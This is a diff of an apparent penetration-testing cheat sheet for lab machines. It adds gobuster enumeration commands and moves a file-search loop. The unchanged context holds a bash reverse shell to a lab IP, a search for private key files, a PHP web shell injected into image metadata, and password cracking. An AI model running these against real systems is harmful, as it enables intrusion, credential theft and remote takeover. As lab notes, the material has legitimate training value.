@@ -16,6 +16,11 @@ Find readable files with following extensions
 find / -readable 2>/dev/null | egrep '(\.key$|\.pub$|\.bak$|\.crt$|\.ca$|^id_rsa)'
 ~~~
 
+Find files that aren't installed by the system
+~~~
+for i in $(ls $(pwd)/*); do dpkg --search $i 1>/dev/null; done
+~~~
+
 Bash reverse shell
 ~~~
 bash -i >& /dev/tcp/10.10.10.10/444 0>&1
@@ -40,11 +45,6 @@ stty raw -echo
 F+G+ENTER
 ~~~
 
-Find files that aren't installed by the system
-~~~
-for i in $(ls $(pwd)/*); do dpkg --search $i 1>/dev/null; done
-~~~
-
 Inject PHP into image
 ~~~
 exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg
@@ -66,6 +66,12 @@ john --wordlist=wordlist.txt passwords.txt
 WFUZZ
 ~~~
 wfuzz  -w /usr/share/wordlists/dirb/common.txt --hc 404,500 -u http://10.10.10.168:8080/
+~~~
+
+Gobuster
+~~~
+gobuster dir -u http://10.10.10.170/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php
+gobuster vhost -u http://10.10.10.170/ -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 ~~~
 
 **Windows**
